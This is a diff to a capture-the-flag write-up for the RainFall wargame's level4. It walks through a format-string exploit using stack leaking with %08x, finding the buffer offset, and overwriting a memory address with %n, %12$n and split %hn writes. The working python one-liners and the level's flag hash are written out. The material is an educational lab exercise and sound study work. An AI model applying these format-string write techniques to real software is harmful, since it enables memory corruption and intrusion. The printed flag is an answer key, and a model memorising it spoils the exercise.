@@ -9,7 +9,7 @@ level4@RainFall:~$ python -c "print('AAAA' + '%08x ' * 20)" | ./level4
 AAAAb7ff26b0 bffff784 b7fd0ff4 00000000 00000000 bffff748 0804848d bffff540 00000200 b7fd1ac0 b7ff37d0 41414141 78383025 38302520 30252078 25207838 20783830 78383025 38302520 30252078
 ```
 
-Buffer start 11 addresses further. So we can write something in the address:
+Buffer start is the 12th addresses further. So we can write something in the address:
 
 ```bash
 (gdb) r < <("print('\x10\x98\x04\x08' + '%08x ' * 11 + '%n')")
@@ -43,5 +43,30 @@ Now we can do the same thing but write the value:
 level4@RainFall:~$ python -c "print('\x10\x98\x04\x08' + '%08x ' * 10 + '%16930022d%n')" > /tmp/a
 level4@RainFall:~$ cat /tmp/a - | ./level4
 (...)
+0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+```
+
+Go further with `%X$n` modifier:
+
+```bash
+level4@RainFall:~$ python -c 'print("\x10\x98\x04\x08" + "%16930112d%12$n")' | ./level4
+0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+```
+
+> 0x1025544 (16930116 in decimal) - 94 (characters already printed) = 16930022
+And with `$X$hn`:
+
+```bash
+Split the address to write in 2 bytes:
+high = 0x102 = 258
+low = 0x5544 = 21828
+08049812 + 08049810 + %Xd%12$n + "%Yd%13$n"
+X = 258 - 8 = 250
+Y = 21828 - X + 8 = 21570
+```
+
+```bash
+level4@RainFall:~$ python -c 'print("\x12\x98\x04\x08" + "\x10\x98\x04\x08" \
++ "%250d%12$hn" + "%21570d%13$hn")' | ./level4
 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
 ```
